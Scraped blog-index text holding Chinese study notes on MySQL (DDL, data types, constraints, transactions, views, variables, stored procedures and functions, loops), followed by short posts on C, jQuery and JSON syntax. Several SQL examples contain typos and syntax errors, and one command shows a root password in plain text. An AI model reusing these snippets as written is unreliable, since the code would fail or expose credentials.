假如要删除的表中有自增长列，如果用DELETE删除后，自增长列的值从断点开始；而TRUNCATE删除后，再插入数据，自增长列的值从1开始。 TRUNCATE删除没有返回值，而DELETE有返回值。 TRUNCATE删除不能回滚，而DELETE删除后可以回滚。 110联合也可以实现多行数据插入操作。（INSERT INTO 表名 SELECT …… UNION SELECT ……UNION……） 111库已存在，再次创建会报错。 优化： 1CREATE DATABASE IF NOT EXISTS books; 112修改列名 1ALTER TABLE 表名 CHANGE COLUMN 原列名 新列名 数据类型; 修改列的类型或约束 1ALTER TABLE 表名 MODIFY COLUMN 列名 新数据类型; 添加新列 1ALTER TABLE 表名 ADD COLUMN 列名 数据类型 【FIRST|AFTER|LAST 字段名】; 删除列 1ALTER TABLE 表名 DROP COLUMN 列名; 修改表名 1ALTER TABLE 表名 RENAME TO 新表名; 115123# IF EXISTS 用于表、库的操作。DROP TABLE IF EXISTS 表名;SHOW TABLES; 116表的复制 123456789101112131415161718# 仅仅复制对象表的结构CREATE TABLE 表名 LIKE 复制的对象表;# 复制对象表的结构和数据，当然也可以只复制一部分CREATE TABLE 表名SELECT * FROM 复制的对象表;# 复制部分数据CREATE TABLE 表名SELECT 部分属性列名FROM 对象表名WHERE 筛选条件;# 复制表的部分字段结构CREATE TABLE 表名SELECT 部分属性列名FROM 表名where 永假表达式; 118Tinyint：1字节 Smallint：2字节 Mediumint：3字节 Int\\Integer：4字节 Bigint：8字节 整型的特点： 如果不设置无符号还是有符号，默认是有符号，如果想设置无符号数，需要添加unsigned关键字。 如果插入的数值超出了整型的范围，会警告out of range，默认插入临界值。 如果不设置长度，会有默认的长度。（INT(9)） INT(长度)搭配ZEROFILL关键字，默认长度不会改变存储范围，只是显示的时候会有不同，显示位数不足会自动补0。 浮点数 float：4字节 double：8字节 定点型 DEC(M,D) DECIMAL(M,D) float、double中M\\D可以省略，会随着插入值的精度来决定精度。 DECIMAL虽然声明时可以省略，但是会被默认置为(10,0)，。 M：整数部位和小数部位的总位数，超出范围插入临界值。 D：小数点后的位数。 定点型的精度会更高。 所选择的类型越简单越好，越节约空间越好。 121 较短的文本 char：长度省略，默认为1 varchar：比较节省空间，但是效率相对较低，声明时长度不可省略。 当字符没有到达限定长度，字符有多长，分配多长的存储空间。 较长的文本 text blob 位类型 bit binary：包含二进制字符串，下同。 varbinary 枚举类型： ENUM(‘A’,’B’,’C’); 不区分大小写 要求插入值必须属于列表中指定的值之一。 SET类型： 用于保存集合 不区分大小写 SET可以一次选取多个成员，而ENUM只能选一个 根据成员的个数不同，存储所占的字节数也不同。 12s1 SET(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;);INSERT INTO s1 VALUES(&#x27;a,b&#x27;); 122日期型 DATE DATETIME：8字节，1000-9999 TIME YEAR TIMESTAMP：4字节，1970-2038，范围较小，属性容易受Mysql版本和SQLMode的影响，时间戳，占用空间较小。 设置时区： 1SET time_zone = &#x27;+9:00&#x27;; 125 常见约束：一种限制，用于限制表中的数据的准确性和可靠性。 NOT NULL（非空约束）：保证该字段的值不能为空。 DEFAULT：用于保证该字段有默认值。 PRIMARY KEY：主键，用于保证该字段的唯一性，并且非空。 UNIQUE：唯一，用于保证该字段的值具有唯一性，可以为空. CHECK：mysql中不支持，检查约束。 FOREIGN KEY：外键约束。 在从表添加外键约束，用于引用主表中的某值。 添加时机：创建、修改表（modify） 列级约束：六大约束语法都支持，但外键没有效果。 表级约束：除了非空和默认，其他都支持。 主键、外键、唯一键，自动生成索引 唯一键： 1CONSTRAINT uq UNIQUE(seat); #唯一键 检查键： 1CONSTRAINT fk CHECK(gender=&#x27;男&#x27; OR gender=&#x27;女&#x27;); 允许组合主键和组合唯一键，但不推荐。 主键的关联列必须是一个KEY，一般是主键或唯一键。 插入数据，先插主表，再插从表。 删除先删从表，再删主表。 130添加列级约束：MODIFY 添加表级约束：ALTER TABLE 表名 ADD PRIMARY KEY(列名); 1311.删除非空约束 1ALTER TABLE 表名 MODIFY COLUMN stuname Varchar(20) NULL; 2.删除默认约束： 1ALTER TABLE 表名 MODIFY COLUMN age INT; 3.删除主键： 1ALTER TABLE 表名 DROP PRIMARY KEY; 4.删除唯一键： 1SHOW INDEX FROM 表名;ALTER TABLE 表名 DROP INDEX 索引名; 5.删除外键 1ALTER TABLE 表名 DROP FOREIGN KEY 外键名; 6.添加外键 1ALTER TABLE 表名 ADD CONSTRAINT 约束名 FOREIGN KEY(列名) REFERENCES 表名(列名); 132标识列：自增长列：可以不用手动插值，系统提供默认的序列值。 1.创建表时设置标识列 1# AUTO_INCREMENT关键字ID INT PRIMARY KEY AUTO_INCREMENT; 1# 查看起始值和增长值SHOW VARIABLE LIKE &#x27;%auto_increment%&#x27;;# 所以可以通过设置变量值改变起始值，步长，mysql中不允许设置起始值，但是可以设置步长。# 设置起始值：手动插入一个起始值即可。 特点： ​ 标识列必须和主键搭配吗？不一定，但要求是一个键，比如唯一键也可以。 ​ 一个表可以有几个标识列？至多一个。 ​ 标识列的类型：只能是数值型，float都可以。 ​ 标识列设置步长：SET AUTO_INCREMENT_INCREMENT = ? / 手动设置 134TCL语句：Transation Control Language，事务控制语言。 事务：一个或者一组sql组成一个执行单元，这个执行单元要么全部执行，要么全部不执行。 在mysql中的数据用各种不同的技术存储在文件中(内存中)。 SHOW ENGINES：查看mysql支持的存储引擎。 在mysql中用的最多的存储引擎有：innodb、myisam、memory等。其中innodb支持事务，而myisam、memory等不支持事务。 特点：事务特点—ACID 135隐式事务：事务没有明显的开启和结束的标记。 如：insert、update、delete等。 Variable_name Value autocommit ON（自动提交开启） 显示事务：事务具有明显的开启和结束的标记。 1# 关闭自动提交。# 开启事务SET autocommit = 0;START TRANSACTION; # 可选的# 编写事务中的SQL语句。语句;语句;……# 结束事务commit;# 提交事务，提交到文件rollback;# 回滚事务 136脏读 不可重复读 幻像读 丢失更新 123456# 查看当前mysql连接的隔离级别：SELECT @@tx_isolation;# 设置当前Mysql连接的隔离级别：SET transation isolation level red committed;# 设置数据库系统的全局隔离级别：SET global transation isolation level read committed; 脏读 不可重复读 幻读 read uncommitted √ √ √ read committed × √ √ repeatable read × × √ serializable × × × mysql默认为第三个隔离级别，repeatable read。 oracle默认为第二个隔离级别，read committed。 13812savepoint 节点名; # 设置节点rollback to 节点名; # 回滚到保存点 139视图：虚拟表，和普通表一样。 mysql5.1版本出现的新特性，是通过表动态生成的数据，只保存了sql逻辑，不保存查询结果。 12345CREATE VIEW 视图名AS 查询语句# 查看视图SELECT * FROM 视图名; 修改视图： 1CREATE OR REPLACE VIEW 视图名 AS 查询语句; 1ALTER VIEW 视图名 AS 查询语句; 删除视图 1DROP VIEW 视图名,视图名,……; 修改视图：把视图当做表进行操作。 插入 1INSERT INTO 视图名 VALUES(); 修改 删除 如果不希望更改视图，可以为其添加权限 具备以下特点的视图，实际上不允许更新： 包含以下关键字的sql语句：分组函数、distinct、group by、having、union、union all 常量视图 SELECT中包含子查询 JOIN FROM 一个不能更新的视图 WHERE子句的子查询引用了FROM子句中的表。 148删除主表记录： 级联删除 1# 外键设置ON DELETE CASCADE; 级联置空 1# ON DELETE SET NULL; 唯一键 添加唯一 1ALTER TABLE 表名 ADD CONSTRAINT 约束名称 UNIQUE(字段名); 删除唯一 1ALTER TABLE 表名 DROP INDEX 索引名; 149 变量 系统变量 全局变量 会话变量 自定义变量 用户变量 局部变量 1234567891011121314151617181920212223242526272829# 系统变量：由系统提供，不是用户定义，属于服务器层面。# 使用语法：/*1.查看所有系统变量SHOW GLOBAL VARIABLES; # 全局变量SHOW SESSION VARIABLES; # 会话变量*//*2.查看满足条件的部分系统变量SHOW GLOBAL|[SESSION] VARIBALES LIKE &#x27;%char%&#x27;;*//*3.查看指定的某个系统变量的值SELECT @@global|[session].系统变量名;*//*4.为系统变量赋值方式一：SET global|[session]系统变量名 = 值;方式二：SET @@global|[session].系统变量名 = 值;注意：如果是全局级别，则需要添加GLOBAL，如果是会话级别，则需要添加SESSION,不写默认为SESSION*//*全局变量作用域：服务器，每次启动将为所有的全局变量设置初始值。会话变量作用域：仅仅针对当前会话（连接）有效，更改后另一个连接不受影响。*/ 1234567891011121314151617181920212223242526# 自定义变量：用户自定义的，不是由系统创建的。使用步骤：声明、赋值、使用/*作用域：针对于当前会话/连接有效，同于系统变量中的会话变量的作用域。应用在任何地方，也就是BEGIN END里面或BEGIN END*/# 1.声明并初始化SET @用户变量名 = 值;或SET @用户变量名 := 值;或SELECT @用户变量名 :=值;# 2.赋值# 方式一：通过SET或SELECTSET @用户变量名 = 值;或SET @用户变量名 := 值;或SELECT @用户变量名 :=值;案例：SET @name = &#x27;小雨&#x27;;SET @name = 100;# 方式二：通过SELECT INTOSELECT 字段 INTO 变量名FROM 表;# 3.查看用户变量的值SELECT @用户变量名; 1# 局部变量/*作用域：仅仅在定义的BEGIN END块中。应用在BEGIN END中的第一句话！！！*//*1.声明DECLARE 变量名 类型;DECLARE 变量名 类型 DEFAULT 值;2.赋值方式一：通过SET或SELECTSET 局部变量名 = 值;或SET 局部变量名 := 值;或SELECT @局部变量名 :=值;案例：SET name = &#x27;小雨&#x27;;SET name = 100;方式二：通过SELECT INTOSELECT 字段 INTO 变量名FROM 表;3.使用SELECT 局部变量名;*/ 作用域 定义和使用的位置 语法 用户变量 当前会话 会话中的任何地方 添加加@符号，不用限定类型 系统变量 BEGIN END中 只能在BEGIN END中，且为第一句话 一般不用加@符号，需要限定类型 1# 案例：声明两个变量并初始化，求和，打印# 1.用户变量SET @m = 10;SET @n = 100;SET SUM = @m + @n;SELECT @SUM;# 局部变量DECLARE m INT DEFAULT 1;DECLARE n INT DEFAULT 2;DECLARE sum INT;SET sum = m+n;SELECT sum; 155存储过程与函数 提高代码重用性、简化操作、减少编译次数、减少了和数据库服务器的连接次数，提高了效率。 1# 存储过程/*含义：一组预先编译的SQL语句的集合，理解成批处理语句。*/# 创建/*CREATE PROCEDURE 存储过程名(参数列表)BEGIN 存储过程体(一组合法的SQL语句)END注意：1.参数包含三部分： 参数模式 参数名 参数类型 参数模式： IN：该参数可以作为输入，也就是该参数需要调用方传入值。 OUT：该参数可以作为输出，也就是该参数可以作为返回值。 INOUT：该参数既可以作为输入，体，也就是参数既需要传入值，也可以返回值。2.如果存储过程体仅有一句话，BEGIN END可以省略3.存储过程体的每条SQL语句的结尾必须加分号。 存储过程的结尾可以使用DELIMITER重新设置 语法： DELIMITER 结束标记 DELIMITER $*/# 调用/*CALL 存储过程名(实参列表);*/ 1571# 空参列表/*案例：插入admin表中五条记录*/SELECT * FROM admin;DELIMITER $ # 必须是$结尾，不要多或者少，而且这里声明之后没有;！！！！！！！！CREATE PROCEDURE MYP1();BEGIN INSERT INTO admin(username,password) VALUES(&#x27;&#x27;,&#x27;&#x27;);END$# 调用CALL MYP1()$ 158创建带in模式参数的存储过程 1# 案例1：创建存储过程实现 根据女性姓名查询配偶信息CREATE PROCEDURE myp2(IN womanName varchar(20))BEGIN SELECT m.* FROM man AS m RIGHT JOIN woman w ON m.id = w.husband WHERE w.name = womanName; /*相当于局部变量*/ END $# 调用CALL myp2(&#x27;小七&#x27;)$ 12345678910111213# ***********************# 案例二：创建存储过程实现，用户是否登录成功。CREATE PROCEDURE myp3(IN username Varchar(20),IN password Varchar(20))BEGIN DECLARE result INT DEFAULT 0; # 声明并初始化 SELECT COUNT(*) INTO result &#x27;&#x27; # 赋值 FROM admin WHERE admin.usename = usename ADN admin.password = password; SELECT IF(result&gt;0,&#x27;success&#x27;,&#x27;fail&#x27;); # 使用END $ 159创建带out模式的存储过程 123456789101112# 案例1：根据女性姓名查询配偶信息CREATE PROCEDURE myp4(IN womanName VARCHAR(20),OUT manName VARCHAR(20))BEGIN SELECT m.manName INTO manName FROM man AS m RIGHT JOIN woman w ON m.id = w.husband WHERE w.name = womanName; /*相当于局部变量*/END $# 调用CALL mp4(&#x27;小七&#x27;,@name)$SELECT @name$ 一个存储过程，也支持多个OUT变量返回。 160创建带inout模式参数的存储过程 12345678910111213# 案例一：传入a和b两个值，最终a和b都翻倍并返回CREATE PROCEDURE mp5(INOUT a INT,INOUT b INT)BEGIN/*a\\b为局部变量*/ SET a=a*2; SET b=b*2;END $#调用：定义用户变量，调用，查看结果SET @m = 10$SET @n = 20$CALL mp5(@m,@n)$SELECT @m,@n$ 162删除存储过程：DROP PROCEDURE 存储过程名称;（一次只能删除一个存储过程） 163查看存储过程 1SHOW CREATE PROCEDURE 存储过程名称; 1651234567891011121314151617181920212223242526# 函数/*存储过程：有0个或多个返回值，适合做批量的插入、更新。函数：有且仅有一个返回值，适合做处理数据后返回一个结果。*//* 创建语法*/CREATE FUNCTION 函数名(参数列表) RETURNS 返回类型BEGIN 函数体END/*注意：1.参数列表：包含两部分--参数名、参数类型2.函数体：肯定会有return语句，如果没有会报错，如果RETURN语句没有放在函数体的最后，也不会报错，但不建议。RETURN 值;3.函数体中只有一句话，则可以省略BEGIN END4.使用DELIMITER语句设置结束标记，注意不要多加;*/# 调用语法SELECT 函数名(参数列表) 123456789101112131415# -------------------------------------# 1.无参数个数返回# 案例：返回管理员数目mysql -u root -pzhulanDELIMITER $CREATE FUNCTION fu1() RETURNS INTBEGIN DECLARE c INT; SELECT COUNT(*) INTO c FROM admin; RETURN c;END $SELECT fu1() $ 166查看函数 1SHOW CREATE FUNCTION 存储过程名; 删除存储过程 1DROP FUNCTION 存储过程名; 170流程控制结构 顺序结构：程序从上往下执行。 分支结构：程序从两条或多条路径中选择一条去执行。 循环结构：满足一定条件的基础上，重复执行一段代码。 分支结构 IF函数 功能：实现简单的双分支 语法： 123SELECT IF(表达式1,表达式2,表达式3);# 执行：表达式1成立，返回表达式2，否则返回表达式3# 应用：任何地方。 case结构 情况一：类似于JAVA中的SWITCH语句，一般用于实现等值判断。 123456case 要判断的字段或表达式when 常量1 then 要显示的值1或语句1when 常量2 then 要显示的值2或语句2……else 要返回的值n或语句nend CASE; 情况二：类似于JAVA中的多重IF语句，一般用于实现区间判断。 123456casewhen 要判断的条件1 then 要显示的值1或语句1;when 要判断的条件2 then 要显示的值2或语句2;……else 要返回的值n或语句n;end CASE; 特点： 1.可以作为表达式，嵌套在其他语句中使用，可以放在任何地方，BEGIN END 中，或BEGIN END外面 也可以作为独立的语句去使用，只能放在BEGIN END中 2.如果WHEN中的值满足或条件成立，则执行对应的THEN后面的语句，并结束CASE 如果都不满足，则执行ELSE中的语句或值 3.ELSE可以省略，如果省略了ELSE，并且WHEN中的条件都不满足，则返回NULL 123456789CREATE PROCEDURE test_case(IN score)BEGIN CASE WHEN score &gt;= 90 AND score&lt;= 100 THEN SELECT &#x27;A&#x27;; WHEN score &gt;= 80 THEN SELECT &#x27;B&#x27;; WHEN score &gt;= 70 THEN SELECT &#x27;C&#x27;; ELSE SELECT &#x27;D&#x27;; END CASE;END 173 if结构 功能：实现多重分支 语法： 12345if 条件1 then 语句1;elseif 条件2 then 语句2;……[else 语句n;]end if; 只能用于BEGIN END中 案例：根据传入的成绩，来返回级别。 12345678CREATE FUNCTION test_if(score INT) RETURNS CHARBEGIN IF score &gt;= 90 and score &lt;= 100 THEN RETURN &#x27;A&#x27;; ELSEIF score &gt;= 80 THEN RETURN &#x27;B&#x27;; ELSEIF score &gt;= 60 THEN RETURN &#x27;C&#x27;; ELSE RETURN &#x27;D&#x27;; END IF;END; 174 循环结构 分类： WHILE LOOP REPEAT 循环控制： leave（类似于break，跳出，结束当前所在循环） iterate（类似于continue，结束本次循环，继续下一次循环） 语法 1234567891011121314# WHILE[标签:]WHILE 循环条件 DO 循环体;END WHILE [标签];# LOOP：可以用来模拟简单的死循环【标签:】LOOP 循环体;END LOOP [标签];# REPEAT【标签:】REPEAT 循环体;UNTIL 结束循环的条件 【标签】; 案例：批量插入，根据次数插入到admin表中 123456789CREATE PROCEDURE test_while(IN count INT)BEGIN DECLARE i INT; SET i = 1; WHILE i &lt;= count DO INSERT INTO admin VALUES(……); SET i = i + 1； END WHILE;END; 添加leave 如果次数大于20则停止。 1234567891011CREATE PROCEDURE test_while(IN count INT)BEGIN DECLARE i INT; SET i = 1; a:WHILE i &lt;= count DO INSERT INTO admin VALUES(……); SET i = i + 1； IF i &gt;= 20 THEN leave a; END IF; END WHILE;END; 添加iterate语句 插入偶数次 1234567891011CREATE PROCEDURE test_while(IN count INT)BEGIN DECLARE i INT; SET i = 0; a:WHILE i &lt;= count DO SET i = i + 1； IF MOD(i,2)!=0 THEN iterate a; END IF; INSERT INTO admin VALUES(……); END WHILE;END; MySQL高级 MySql的架构介绍 mysql简介 mysql linux版的安装 mysql配置文件 mysql逻辑架构介绍 mysql存储引擎 索引优化分析 性能下降SQL慢：执行时间长、等待时间长 常见通用的JOIN查询 索引简介 性能分析 索引优化（SQL调优） 查询截取分析 查询优化 慢查询日志 批量数据脚本 Show Profile 全局查询日志 主从复制 复制基本原理 复制基本原则 复制的最大问题 主从常见配置 MySql锁机制 行锁 表锁 页锁 02 MySql简介MySQL是一个关系型数据库管理 系统，由瑞典MySQL AB公司开发，目前属于Oracle公司。MySQL是一种关系数据库管理系统，将数据保存在不同的表中，而不是将所有数据放在一个大仓库内， 这样就增加了速度并提高了灵活性。Mysq|是开源的，所以你不需要支付额外的费用。Mysq是可以定制的，采用了GPL协议，你可以修改源码来开发自己的Mysql系统。Mysq|支持大型的数据库。可以处理拥有上千万条记录的大型数据库。MySQL使用标准的SQL数据语言形式。Mysq可以允许于多个系统上，并且支持多种语言。这些编程语言包括C、C++、Python、 Java、 Perl、 PHP、 Eiffel、 Ruby和Tcl等。MySQL支持大型数据库，支持5000万条记录的数据仓库，32位系统表文件最大可支持4GB, 64位系统支持最大的表文件为8TB。 后端向数据库开发转型。 数据库内部结构和原理 数据库建模优化 数据库索引建立 SQL语句优化 SQL编程(自定义函数、存储过程、触发器、定时任务) mysq|服务器的安装配置 数据库的性能监控分析与系统优化 各种参数常量设定 主从复制 分布式架构搭建、垂直切割和水平切割 数据迁移 容灾备份和恢复 shell或python等脚本语言开发 对开源数据库进行二次开发 03 RPM安装1234 检查是否安装了mysqlrpm qa|grep i mysql #rpm ivh mysql-community-server-5.7.16-1.el7.x86_64.rpm","categories":[],"tags":[{"name":"Sql","slug":"Sql","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Sql/"}]},{"title":"补习C语言","slug":"补习C语言","date":"2021-07-14T08:21:26.000Z","updated":"2021-09-11T11:13:20.996Z","comments":true,"path":"2021/07/14/补习C语言/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/07/14/%E8%A1%A5%E4%B9%A0C%E8%AF%AD%E8%A8%80/","excerpt":"","text":"C语言教材：C语言程序设计现代方法—第二版—（K.N.King著） 第11章 指针1 第12章 指针和数组第13章 字符串第14章 预处理器第15章 编写大型程序第16章 结构、联合、枚举第17章 指针的高级应用第18章 声明第19章 程序设计第20章 底层程序设计第21章 标准库第22章 输入/输出第23章 库对数值和字符数据的支持第24章 错误处理第25章 国际化特性第26章 其他库函数第27章 C99对数学计算的新增支持","categories":[],"tags":[{"name":"C语言","slug":"C语言","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/C%E8%AF%AD%E8%A8%80/"}]},{"title":"jQuery选择器和DOM操作","slug":"前端学习20","date":"2021-06-02T11:30:08.000Z","updated":"2021-06-02T12:54:08.365Z","comments":true,"path":"2021/06/02/前端学习20/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/06/02/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A020/","excerpt":"","text":"看了一会，去搜才发现，没必要学jQuery的，现在都是A、V、R三选一/二了，大人，时代变了，嘤嘤嘤 第18章 jQuery选择器和DOM操作课程提要 jQuery简介 jQuery选择器 jQueryDOM操作 18.1 JQuery简介随着互联网的迅速发展，web页面的广泛应用，人们的需求不仅限于页面的功能，而更多地注重页面展示形式 和用户体验度。JavaScript语言可以很好地满足程序开发者的需求， 开发出用户体验度很高的页面，因而越来越受 到广大程序员的关注；但是其代码的开发量是比较大的，jQuery 是 JavaScript 库中的相对优秀的。近年来，随着 它的代码高效、兼容性强而风靡全球，越来越多的开发者痴迷其中；宗旨是用尽可能少的代码实现更多的功能。 18.1.1 jQuery是什么 jQuery 是由美国人 JohResig 于 2006 年创建的一个开源项目，随着被人们的熟知，越来越多的程序高手加入 其中，完善和壮大其项目内容；如今已发展成为集 JavaScript、CSS、DOM、Ajax 于一体的强大框架体系，它的主 旨是 ：write lss,do more! 一般一个项目只使用一个框架。 18.1.2 jQuery的基本功能访问和操作 DOM 元素 使用 jQuery 库，可以很方便地获取和修改页面中的某元素，无论是删除、移动、复制某元素，jQuery 都提供了一整套方便、快捷的方法，既减少了代码的编写，又大大提高了用户对页面的体验度。具体示例我们将在后面的 章节中陆续展示。 控制页面样式 通过引入 jQuery，程序开发人员可以很便捷地控制页面的 CSS 文件。浏览器对页面文件的兼容性一直以来都是页面开发者最为头痛的事，而使用 jQuery 操作页面的样式，却可以很好地兼容各种浏览器。 对页面事件的处理 引入 jQuery 库后，使页面的表现层与功能开发分离，开发者可以更多地专注于程序的逻辑与功效 ；页面设计者侧重于页面的优化与用户体验，通过事件绑定机制，可以很轻松地实现二者的结合。 大量插件在页面中的运用 在引入 jQuery 库后，还可以使用大量的插件来完善页面的功能和效果，如表单插件、UI 插件，这些插件的使用，极大丰富了页的展示效果，原来使用 JavaScript 代码遥不可及的功能，通过插件的引入都可以轻松实现。 与 Ajax 技术的完美结合 Ajax 的异步读取服务器数据的方法，极大方便了程序的开发，加深了用户的页面体验度；而引入 jQuery 库后，不仅完善了原有的功能，而且减少了代码的书写，利用其内部对象或函数，加上几行代码就可以实现复杂的功能。 提供了大量的动画处理 18.1.3 搭建jQuery开发环境18.1.3.1 本地引入jQuery由于 jQuery 是一个完整的 JavaScript 文件库， 因此， 搭建 jQuery 开发环境十分简单， 无须安装任何文件，只需要先在 jQuery 官方网站下载最新的文件库，然后将该文件库引入页面中的&lt;head&gt;元素间即可。 下载 jQuery 文件库 在 jQuery 的官方网站（http:// jquery.com）下载最新版本的 jQuery 文件库，其网站页面如图 18-1 所示。在网站中，选择大小为 101KB 的压缩包，单击下载按钮，便可以将最新版的 jQuery 框架下载到本地。 引入 jQuery 文件库 下载完 jQuery 框架文件后，并不需要任何的安装，仅需要使用 &lt;script&gt; 文件导入标记， 将 jQuery 框架文件jquery-3.3.1.min.js 导入页面中即可。假设该文件下载后保存在项目文件夹 Jscript 中，那么，在页面的&lt;head&gt;&lt;/head&gt; 中加入如下代码： 12345&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot; src=&quot;Jscript/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; console.dir($);//查看引入jQuery成功与否&lt;/script&gt; 在页面的头部分加入上述代码后，便完成了 jQuery 框架的引入，现在可以开始我们的jQuery 之旅了。 18.1.3.2 CDN引入注意jQuery必须先引入，然后才能调用API，可以在head引入，也可以在最后引入。 12&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot; src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt; 18.1.3.3 编写第一个简单的 jQuery 程序首先，我们来编写一个简单的程序。 功能描述 当页面加载时，以居中的方式在页面中显示“您好！欢迎来到jQuery 的精彩世界。”字样。 代码 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;第一个简单的jQuery程序&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; div&#123; padding:8px 0px;font-size:12px; text-align:center;border:solid 1px #888;&#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function() &#123; $(&quot;div&quot;).html(&quot;您好！欢迎来到jQuery的精彩世界。&quot;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 代码分析 123$(document).ready(function() &#123; $(&quot;div&quot;).html(&quot;您好！欢迎来到jQuery的精彩世界。&quot;);&#125;); 该段代码类似于传统的 JavaScript 代码： 123window.onload=function()&#123;// 程序段&#125; 虽然上述两段代码在功能上可以互换，但它们之间又有许多区别。 执行时间不同 ：$(document).ready 在页面框架下载完毕后就执行 ；而 window.onload 必须在页面全部加 载完毕（包含图片下载）后才能执行。很明显前者的执行效率高于后者。 执行数量不同 ：$(document).ready 可以重复写多个， 并且每次执行结果不同 ； 而window.onload 尽管可 以执行多个，但仅输出最后一个执行结果，无法完成多个结果的输出。 $(document).ready(function(){}) 可以简写成 $(function(){})，因此下面的代码是等价的。 1234567$(document).ready(function()&#123; // 程序段&#125;)// 等价于$(function()&#123;// 程序段&#125;) 18.1.1.4 学习文档中文文档 jQuery API 中文文档 18.2 jQuery选择器 根据所获取页面中元素的不同，可以将 jQuery 选择器分为四大类：基本选择器、层次选择器、过滤选择器、 表单选择器。其中，在过滤选择器中又可分为 ：简单过滤选择器、内容过滤选择器、可见性过滤选择器、属性过滤 选择器、子元素过滤选择器、表单对象属性过滤选择器。 18.2.1 基本选择器 基本选择器是 jQuery 中使用最频繁的选择器，它由元素 ID、Class、元素名、多个选择符组成，通过基本选 择器可以实现大多数页面元素的查找。 基本语法表 选择器 功能 返回值 #id 根据给定的ID匹配一个元素 单个元素 element 根据给定的元素名匹配所有元素 元素集合 .class 根据给定的类匹配元素 元素集合 * 匹配所有元素 元素集合 selector1,selectorN 将每一个选择器匹配到的元素合并后一起返回 元素集合","categories":[],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/jQuery/"}]},{"title":"JavaScript高级-JSON和DOM操作","slug":"前端学习19","date":"2021-05-31T14:40:21.000Z","updated":"2021-06-02T12:57:22.226Z","comments":true,"path":"2021/05/31/前端学习19/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/05/31/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A019/","excerpt":"","text":"第17章 JavaScript高级-JSON和DOM操作课程提要 JSON DOM介绍 节点操作 节点属性操作 节点文本操作 DOM节点样式操作 17.1 JSON17.1.1 JSON语法JSON(EMA制定的一个数据表示规范，是ECMAScript的一个子集)和XML(EXtensible Markup Language，可扩展标记语言)类型，都是一种结构化的数据表示方式。所以，JSON并不是JavaScript独有的数据格式，其他很多 语言都可以对JSON进行解析和序列化。 JavaScript Object Notation，JS对象简谱，一种轻量级数据交换格式，用独立编程语言的文本格式来存储和表示数据，优点是易于阅读和编写，同时也易于浏览器解析和生成，并有效提升网络传输速率。 与XML对比，JSON书写或解析时是一个对象，更容易解析，而XML是由用户自定义标签存储数据的，对于前端而言不易书写，且解析困难。 JSON文件内容：它可以是一个对象，可以是一个数组，也可以是数组和对象的结合。 JSON写在哪：可以写在JavaScript代码中，也可以形成一个独立的.json文本文件。 JS中书写JSON： 果是对象，键可以用单或双引号引起来，也可以不加引号； 如果值是字符串，可以用单引号或双引号引起来； 数值型、逻辑型、null不能加引号。 独立的JSON文件书写： 文件扩展名必须是.json，不能出现其他编程代码，它只是一个文本文件而已。 数据不能赋给某个变量； 键必须用双引号引起来； 值如果是字符型数据，必须用双引号引起来，其他类型的数据不能用引号括起来； 在JSON文件中不能添加任何注释！ JSON的语法可以表示三种类型的值： 简单值：可以在JSON中表示字符串、数值、布尔值和null。但JSON不支持JavaScript中的特殊undefined。 对象：顾名思义。 数组：顾名思义。 实际开发：在实际开发过程中，如果后台工程师还没创建好后台数据接口时，前端工程师可以先做数据mock，即数据模拟，写对应的CSS/HTML/JS代码，等后台数据可以调用时，再进行替换即可。 项目开发中，数据最好分离出来，形成单独的JSON文件。 17.1.1.1 简单值123和”Hou” 这两个量就是JSON的表示方法，一个是JSON数值，一个是JSON字符串。布尔值和null也是有效 的形式。但实际运用中要结合对象或数组。 17.1.1.2 对象JavaScript对象字面量表示法： 1234var box = &#123; name: &#x27;Hou&#x27;, age: 100 &#125;; 而JSON中的对象表示法需要加上双引号，并且不存在赋值运算和分号： 1234&#123; &quot;name&quot;: &quot;Hou&quot;, //使用双引号，否则转换会出错 &quot;age&quot;: 100 &#125; 17.1.1.3 数组JavaScript数组字面量表示法： 1var box = [100, &#x27;Hou&#x27;, true]; 而JSON中的数组表示法同样没有变量赋值和分号： 1[100, &quot;Hou&quot;, true] 一般比较常用的一种复杂形式是数组结合对象的形式： 1234567891011121314[ &#123;&quot;title&quot;: &quot;a&quot;,&quot;num&quot;: 1&#125;,&#123;&quot;title&quot;: &quot;b&quot;,&quot;num&quot;: 2&#125;,&#123;&quot;title&quot;: &quot;c&quot;,&quot;num&quot;: 3&#125; ] PS：一般情况下，我们可以把JSON结构数据保存到一个文本文件里，然后通过XMLHttpRequest对象去加载它，得到这串结构数据字符串(XMLHttpRequest对象将在Aajx章节中详细探讨)。所以，我们可以模拟这种过程。 模拟加载JSON文本文件的数据，并且赋值给变量。 1var box = &#x27;[&#123;&quot;name&quot;: &quot;a&quot;,&quot;age&quot;: 1&#125;,&#123;&quot;name&quot;: &quot;b&quot;,&quot;age&quot;: 2&#125;]&#x27;; PS：上面这短代码模拟了**var box = load(‘demo.json’);**赋值过程。因为通过load加载的文本文件，不管内容是 什么，都必须是字符串。所以两边要加上双引号。 其实JSON就是比普通数组多了两边的双引号，普通数组如下： 1var box = [&#123;name: &#x27;a&#x27;, age: 1&#125;,&#123;name: &#x27;b&#x27;, age: 2&#125;]; 17.1.2 